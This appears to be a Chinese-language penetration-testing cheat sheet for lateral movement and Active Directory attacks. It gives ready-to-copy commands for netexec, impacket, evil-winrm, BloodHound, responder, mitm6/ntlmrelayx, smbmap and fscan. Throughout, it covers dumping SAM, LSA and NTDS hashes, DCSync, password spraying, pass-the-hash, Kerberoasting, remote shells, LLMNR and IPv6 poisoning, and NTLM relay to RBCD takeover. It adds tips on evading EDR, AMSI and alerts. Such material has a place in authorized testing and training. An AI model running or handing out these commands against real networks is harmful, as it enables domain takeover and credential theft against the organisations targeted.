# 内网横向与 AD

拿到立足点后的内网枚举、凭据转储、协议中继、AD 攻击路径分析与横向移动。本文件命令均可直接复制,占位符用尖括号标注(如 `<目标IP>` `<域名>` `<DC的IP>`)。

本文件工具:netexec(nxc)、impacket 套件、evil-winrm、BloodHound+SharpHound、responder、mitm6+ntlmrelayx、smbmap、smbclient、enum4linux、enum4linux-ng、fscan

---

## netexec(nxc)— 内网协议枚举与凭据验证瑞士军刀

来源:apt 包 `netexec`(/usr/bin/nxc,`netexec` 与 `nxc` 是同一工具)

### 凭据验证与共享枚举(smb)

```bash
nxc smb <目标IP> -u <用户名> -p <密码> --shares          # 验证凭据+列共享;[+]=有效,(Pwn3d!)=是目标管理员
nxc smb <目标IP> -u '' -p '' --shares                    # 空会话/匿名枚举
nxc smb <目标CIDR> --gen-relay-list relay_targets.txt    # 输出未启用 SMB 签名的主机清单(喂给 ntlmrelayx)
```

### 密码喷洒与哈希传递

```bash
nxc smb <目标CIDR> -u users.txt -p '<统一密码>' --continue-on-success   # 一个密码喷整个用户表,成功不中断
nxc smb <目标IP> -u <用户名> --hashes :<NT哈希> --shares                # NT 哈希直接验证(pass-the-hash)
nxc smb <DC的IP> -u <用户名> -p <密码> --pass-pol                        # 查域密码策略(喷洒前必看锁号阈值)
```

### 凭据转储(--sam/--lsa/--ntds)

```bash
nxc smb <目标IP> -u <管理员用户> -p <密码> --sam --lsa    # 抓 SAM 与 LSA 密钥(需对目标管理员权限)
nxc smb <DC的IP> -u <管理员用户> -p <密码> --ntds         # 直接倾倒域库 NTDS(等价 impacket-secretsdump)
```

### 其他协议(ssh/winrm/mssql)

```bash
nxc ssh <目标IP> -u root -p <密码> --sudo-check           # SSH 凭据验证并检查 sudo 可用性
nxc winrm <目标IP> -u <用户名> -p <密码> -x whoami         # WinRM 远程执行 cmd 命令(-X 为 PowerShell)
nxc mssql <目标IP> -u sa -p <密码> -q 'SELECT @@version'  # MSSQL 执行 SQL 查询
```

参数速查:

- 协议位:`smb` / `ssh` / `winrm` / `mssql` / `ldap` / `ftp` / `rdp` 等
- `-u / -p`:用户名(或文件)/ 密码(或文件);`-d <域名>` 域认证,`--local-auth` 本地认证
- `--hashes :<NT哈希>`:哈希传递
- `--shares` / `--users` / `--sessions` / `--loggedon-users` / `--disks`:枚举项
- `--pass-pol`:域密码策略与锁定阈值
- `--sam` / `--lsa` / `--ntds`:本地凭据/LSA/域库转储
- `-x <命令>` / `-X <PS命令>`:cmd / PowerShell 远程执行
- `--continue-on-success`:命中后继续(喷洒全表必备)
- `--gen-relay-list <文件>`:生成可中继(未开 SMB 签名)主机清单

注意: `(Pwn3d!)` 说明当前凭据是目标管理员,可直接上 impacket;喷洒节奏按 `--pass-pol` 阈值控制,别把域号锁死;`--sam/--lsa` 会在目标留 4624/7045 类日志,隐蔽优先时改走离线导出。

## impacket 套件 — Windows 协议利用核心工具集

来源:apt 包 `python3-impacket`(Kali 命令一律 `impacket-` 前缀,如 `impacket-secretsdump`;若按老教程用 pip/git 安装,则写 `secretsdump.py`,两种写法等价)

### 凭据转储 secretsdump

```bash
impacket-secretsdump '<域名>/<用户名>:<密码>@<DC的IP>' -just-dc-ntlm          # DCSync 抓全域 NTLM 哈希(需域管)
impacket-secretsdump '<域名>/<用户名>@<目标IP>' -hashes :<NT哈希> -outputfile hashes   # 远程抓 SAM/LSA/NTDS 三件套
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY local         # 离线解析(pip 版写法,-ntds 离线模式)
```

### 半交互 shell(psexec/wmiexec/smbexec/atexec)

```bash
impacket-psexec '<域名>/<用户名>:<密码>@<目标IP>'                 # SYSTEM cmd;会向 ADMIN$ 上传二进制,EDR 易报
impacket-wmiexec '<域名>/<用户名>@<目标IP>' -hashes :<NT哈希>      # WMI 半交互 shell,不落盘,走 135 端口
impacket-smbexec '<域名>/<用户名>:<密码>@<目标IP>'                # SMB 半交互 shell(走 svcctl 服务)
impacket-atexec '<域名>/<用户名>:<密码>@<目标IP>' 'whoami /all'    # 计划任务一次性执行命令并回显
```

### Kerberos 票据类(GetUserSPNs/getST)

```bash
impacket-GetUserSPNs -request -dc-ip <DC的IP> '<域名>/<用户名>:<密码>'   # Kerberoasting,哈希喂给 hashcat -m 13100
impacket-getST -spn cifs/<目标主机名>.<域名> -impersonate administrator -dc-ip <DC的IP> '<域名>/<账户>:<密码>'   # S4U/RBCD 模拟管理员
KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass <目标主机名>.<域名>   # 用上一步的 ccache 票据直接登录
```

参数速查(各工具通用):

- 账户写法:`<域名>/<用户>:<密码>@<目标>` 或 `<域名>/<用户>@<目标>` + 认证参数
- `-hashes <LM>:<NT>`:哈希认证,LM 留空写作 `-hashes :<NT>`
- `-no-pass`:不提示输密码(配合 `-k` 或 ccache)
- `-k`:Kerberos 认证(需 /etc/krb5.conf 指向域 + KRB5CCNAME 票据)
- `-dc-ip <IP>`:显式指定 DC(DNS 混乱/多网卡环境必加)
- `-aes-key <密钥>`:AES key 认证
- `-target-ip <IP>`:主机名与实际 IP 不一致时指定
- secretsdump 专属:`-just-dc` / `-just-dc-ntlm`(只要域数据)、`-ntds/-system/-security`(离线文件)
- 同目录还有 `impacket-mssqlclient`(MSSQL 客户端)、`impacket-GetNPUsers`(AS-REP Roasting)等,用法相同

注意: 本机命令名区分大小写、以实际安装为准(如 `impacket-GetUserSPNs`);有 EDR 的目标优先 wmiexec/atexec;getST 生成的 ccache 票据通过 `KRB5CCNAME=<票据文件>` 环境变量交给后续 `-k -no-pass` 命令使用。

## evil-winrm — WinRM 交互 Shell 与 PS 脚本加载器

来源:apt 包 `evil-winrm`(/usr/bin/evil-winrm)

```bash
evil-winrm -i <目标IP> -u <用户名> -p <密码>                        # 密码登录(默认 5985 端口)
evil-winrm -i <目标IP> -u <用户名> -H <NT哈希>                      # NT 哈希登录(pass-the-hash)
evil-winrm -i <目标IP> -u <用户名> -p <密码> -s /usr/share/windows-resources/powersploit/Privesc   # -s 加载 ps1 脚本目录
evil-winrm -i <目标IP> -u <用户名> -p <密码> -S -P 5986             # SSL 模式连 5986(HTTPS WinRM)
```

参数速查:

- `-i <IP>`:目标地址
- `-u <用户名>` / `-p <密码>`:账密
- `-H <NT哈希>`:哈希登录
- `-P <端口>`:端口,默认 5985
- `-S`:SSL/TLS 模式
- `-r <域名>`:SPN 域前缀(域内 Kerberos 场景)
- `-s <目录>`:预加载目录下全部 ps1,进入后 `menu` 查看、直接输函数名执行
- `-e <目录>`:加载本地 exe,用 `Invoke-Binary <程序>` 调用

注意: 要求账号在 Remote Management Users 组或为管理员;进入后 `menu` 列功能,`upload/download` 传文件,`Bypass-4MSI` 尝试绕 AMSI(对新版 Defender 常失效);配合 nxc winrm 先验证可达再连。

## BloodHound + SharpHound — AD 攻击路径图谱分析

来源:apt 包 `bloodhound`(GUI)、`neo4j`(图数据库)、`sharphound`(收集器:/usr/share/sharphound/SharpHound.ps1 与 .exe)

### 服务端启动

```bash
sudo neo4j start        # 启动数据库;首次用浏览器访问 http://127.0.0.1:7474 把 neo4j/neo4j 改成强密码
bloodhound              # 启动 GUI,连接 bolt://localhost:7687,账号 neo4j + 刚改的密码
```

### 目标机上收集(SharpHound,在目标机 PowerShell 执行)

```bash
powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain <域名>"   # ps1 版全量收集,产物 zip
SharpHound.exe -c All -d <域名>            # exe 版:先把 /usr/share/sharphound/SharpHound.exe 传上去
powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod DCOnly"   # 隐蔽模式:只查 LDAP 不碰主机
```

### 导入与常用查询

```bash
# GUI 右上角 Upload 上传 zip 后,在查询框执行:
MATCH (u:User {hasspn:true}) RETURN u.name                                   # 可 Kerberoast 的用户
MATCH p=shortestPath((u:User)-[:MemberOf|AdminTo|HasSession|DCSync|GenericAll*1..]->(g:Group)) WHERE toUpper(g.name) CONTAINS 'DOMAIN ADMINS' RETURN p   # 任意用户到域管的路径
```

参数速查(Invoke-BloodHound / neo4j):

- `-CollectionMethod`(`-c`):All / Session(域内登录关系)/ LoggedOn(本机登录)/ DCOnly(隐蔽)/ 组合 `Session,LoggedOn`
- `-Domain <域名>`:指定域;`--SearchForest` 扩到全林
- `--ExcludeDCs`:不触碰 DC,降低告警
- `--LDAPUsername` / `--LDAPPassword`:指定收集用凭据
- `--ZipFilename <名>`:输出文件名
- `sudo neo4j start|stop|status`:数据库生命周期
- `bolt://localhost:7687`:BloodHound 数据库连接串
- `http://127.0.0.1:7474`:首次修改 neo4j 密码入口

注意: Session/LoggedOn 需要目标管理员权限且动静大,隐蔽优先用 `-c DCOnly`;需要新版收集器时走代理下载:`export https_proxy=http://10.211.55.2:2334`;neo4j 密码改后别丢,重置要删数据目录。

## responder — LLMNR/NBT-NS/mDNS 毒化抓取网络凭据

来源:apt 包 `responder`(/usr/sbin/responder,配置 /etc/responder/Responder.conf)

```bash
sudo responder -I eth0 -v              # 正式模式:毒化 LLMNR/NBT-NS/mDNS,抓 NetNTLMv2 哈希
sudo responder -I eth0 -A              # 分析模式:只记录谁在广播解析请求,不响应(先评估环境)
sudo responder -I eth0 -w -F           # 开 WPAD 流氓代理并强制认证(可弹明文/NTLM 凭据)
```

参数速查:

- `-I <接口>`:监听网卡(大写 I,必填;`ALL` 表示全部接口)
- `-A`:分析模式,被动观察不投毒
- `-v`:详细输出(推荐)
- `-w`:启动 WPAD 流氓代理
- `-F`:强制 WPAD 请求走 NTLM/Basic 认证
- `-P`:强制代理认证(高杀伤,不能与 -w 同用)
- `-b`:返回 HTTP Basic 认证(可能直接钓到明文密码)
- `-d`:DHCPv4 投毒,响应里注入 WPAD

注意: 抓到的 NetNTLMv2 存在运行目录 logs/ 下(如 /usr/share/responder/logs/),一行一个 `域名\\用户:::...`,直接 `hashcat -m 5600` 破;要与 ntlmrelayx 联动必须先关自带捕获:编辑 /etc/responder/Responder.conf 把 `SMB = On`、`HTTP = On` 改为 `Off`。

## mitm6 + impacket-ntlmrelayx — IPv6 劫持与认证中继打域

来源:apt 包 `mitm6`(/usr/bin/mitm6)、`python3-impacket`(/usr/bin/impacket-ntlmrelayx)

### 经典组合:中继到 LDAPS 打 RBCD

```bash
sudo mitm6 -d <域名> -i eth0                                   # 终端1:DHCPv6/DNS 欺骗,域内主机 DNS 指向本机
sudo impacket-ntlmrelayx -6 -t ldaps://<DC的IP> --delegate-access   # 终端2:中继到 LDAPS,给机器账户写 RBCD 委派
```

### 中继到 SMB:执行命令 / SOCKS 复用

```bash
sudo impacket-ntlmrelayx -6 -tf relay_targets.txt -smb2support -c 'whoami /all'   # 目标清单来自 nxc --gen-relay-list
sudo impacket-ntlmrelayx -6 -tf relay_targets.txt -smb2support -socks             # 起 SOCKS,凭据可反复 interact 复用
sudo impacket-ntlmrelayx -6 -t smb://<目标IP> -smb2support -wh wpad.<域名>         # WPAD 场景:诱导系统代理送认证
```

参数速查(mitm6 | ntlmrelayx):

- mitm6 `-d <域名>`:只毒化该域的 DNS 查询(务必限定,避免全网广播)
- mitm6 `-i <接口>` / `-b <域名>` 黑名单 / `-hw <主机>` 只响应特定 FQDN
- mitm6 `-r <目标>`:把 Kerberos 认证引向中继目标
- mitm6 `-a`:不发路由通告(对 RA 检测环境)
- ntlmrelayx `-t <协议://IP>` / `-tf <文件>`:中继目标,支持 smb/ldaps/http/mssql/imap
- ntlmrelayx `-6`:监听 IPv6(配合 mitm6 必加)
- ntlmrelayx `-smb2support`:支持 SMB2 中继
- ntlmrelayx `-c <命令>`:中继成功后立即执行命令
- ntlmrelayx `--delegate-access`:写 msDS-AllowedToActOnBehalfOfOtherIdentity(RBCD)
- ntlmrelayx `-socks`:挂起凭据的 SOCKS 代理,`interact <ID>` 切换使用

注意: 中继目标必须未启用 SMB 签名(用 `nxc smb --gen-relay-list` 筛选);`--delegate-access` 拿到权限后接 `impacket-addcomputer` 建机器账户 + `impacket-getST` 接管目标主机;整条链路对网络有扰动,仅限授权环境。

## smbmap — SMB 共享枚举与读写权限探测

来源:apt 包 `smbmap`(/usr/bin/smbmap)

```bash
smbmap -H <目标IP> -u <用户名> -p <密码> -d <域名>     # 列共享及 READ/WRITE/NO ACCESS 权限
smbmap -H <目标IP> -u '' -p ''                        # 空会话枚举
smbmap -H <目标IP> -u <用户名> -p <密码> -R <共享名>   # 递归列出共享内全部文件(-R 空参=遍历所有共享)
smbmap -H <目标IP> -u <用户名> -p <密码> --upload note.txt '<共享名>\note.txt'    # 上传文件验证写权限
smbmap -H <目标IP> -u <用户名> -p <密码> --download '<共享名>\文档.txt'           # 下载文件
```

参数速查:

- `-H <IP>`:目标主机(必填)
- `-u <用户>` / `-p <密码>` / `-d <域名>`:凭据三元组
- `-R [路径]`:递归枚举共享内容
- `-r [路径]`:只列单层目录
- `-P <端口>`:端口,默认 445
- `--download '<共享>\<文件>'`:下载
- `--upload <本地> '<共享>\<远程>'`:上传
- `--del '<共享>\<文件>'`:删除
- `--exclude <共享>`:跳过指定共享

注意: 重点找可写共享(部署目录/临时共享),上传脚本配合计划任务或启动项就是落地路径;共享里先翻配置文件和备份(密码常明文躺在里面)。

## smbclient — 交互式 SMB 文件客户端

来源:apt 包 `smbclient`(/usr/bin/smbclient,同包附 smbget)

```bash
smbclient -L //<目标IP>/ -N                             # 匿名列出共享(-N 免密码交互)
smbclient //<目标IP>/<共享名> -U '<用户名>%<密码>'       # 凭据进入交互 shell(dir/get/put)
smbclient //<目标IP>/<共享名> -U '<用户名>' --pw-nt-hash <NT哈希>   # 传递 NT 哈希登录(PTH)
smbget -R smb://<目标IP>/<共享名>/ -u '<用户名>%<密码>'  # 递归打包下载整个共享
```

参数速查:

- `-L //主机/`:列出目标共享列表
- `-U '<用户>[%密码]'`:凭据,不带 % 则交互询问
- `-N`:跳过密码提示(空会话)
- `--pw-nt-hash <NT哈希>`:所给"密码"实为 NT 哈希
- `-m SMB2` / `-m NT1`:强制协商协议版本
- `-D <目录>`:登录后直接切到指定目录
- `-c '<命令串>'`:非交互执行,如 `-c 'ls;get 机密.txt'`
- 交互内常用:`dir` 列目录、`get`/`put` 收发、`allinfo <文件>` 看属性、`exit` 退出

注意: 老设备协商失败加 `-m NT1`(新 Samba 默认禁 NT1,可用 `--option='client min protocol=NT1'`);传哈希登录与 nxc `--hashes` 验证结论一致,但这里能直接操作文件。

## enum4linux / enum4linux-ng — SMB/RPC 综合信息枚举

来源:apt 包 `enum4linux`(Perl 老版,/usr/bin/enum4linux)、`enum4linux-ng`(Python 重写版,/usr/bin/enum4linux-ng)

```bash
enum4linux -a <目标IP>                             # 老版全量:用户/组/共享/密码策略/RID 枚举一把梭
enum4linux -a -u '<用户名>' -p '<密码>' <目标IP>   # 老版带凭据,枚举结果完整得多
enum4linux-ng -A <目标IP> -oA enum_out             # 新版全量,三格式输出(enum_out.txt/json/yaml)
enum4linux-ng -A -u '<用户名>' -p '<密码>' -R <目标IP> -oJ out.json   # 新版带凭据 + RID 暴力枚举,JSON 入库
```

参数速查(老版 | 新版):

- 老版 `-a`:全量(等于组合 -U -S -G -P 等)
- 老版 `-u <用户>` / `-p <密码>`:凭据
- 老版 `-U` / `-S` / `-G` / `-P`:分别只列 用户 / 共享 / 组 / 密码策略
- 老版 `-o <文件>`:结果落盘
- 新版 `-A`:全量枚举
- 新版 `-u` / `-p`:凭据
- 新版 `-R`:RID 暴力枚举(挖隐藏/低权用户)
- 新版 `-oA` / `-oJ` / `-oY`:全格式 / JSON / YAML 输出

注意: 老版对 2008R2 及以下匿名 RPC 效果最好,新系统必须带凭据;枚举出的用户表和密码策略直接接 nxc 喷洒与 BloodHound;两版可同时跑互补。

## fscan — 内网一键存活/端口/弱口令/漏扫(本机二进制)

来源:本机二进制 `~/tools/bin/fscan`(Go 单文件,免依赖,可直接丢到跳板机运行)

```bash
sudo ~/tools/bin/fscan -h <目标CIDR>                      # 一键:C 段存活+端口+服务弱口令+常见 POC
sudo ~/tools/bin/fscan -h <目标IP> -p 22,80,445,3389,3306,6379 -nopoc   # 指定端口,只爆破不做漏扫
sudo ~/tools/bin/fscan -h <目标IP> -userdf users.txt -pwdf passwords.txt   # 用自己的用户/密码字典爆破
sudo ~/tools/bin/fscan -hf hosts.txt -m smb -t 200        # 从文件读目标,只跑 smb 模块,限 200 线程
```

参数速查:

- `-h <IP/CIDR>`:目标;缺省会默认扫 192.168.1.1/24,务必显式指定!
- `-hf <文件>`:目标列表文件
- `-p <端口>`:端口列表(缺省覆盖常见 Web/数据库/远程端口)
- `-m <模块>`:只跑指定模块(ssh/smb/mysql/mssql/redis/web 等)
- `-user` / `-userdf <文件>`:用户名 / 用户名字典
- `-pw` / `-pwdf <文件>`:密码 / 密码字典
- `-t <线程>`:并发,默认 600
- `-np`:不做存活探测(禁 ICMP 环境直接全扫)
- `-nopoc`:跳过漏洞 POC 验证
- `-u` / `-uf <文件>`:单个 URL / URL 列表(Web 指纹与漏扫)

注意: 结果默认写当前目录 result.txt;内置爆破+POC 动静极大,生产网容易触发安全设备告警,确认授权再用;建议 sudo 运行(ICMP 存活探测需要 raw socket 权限)。
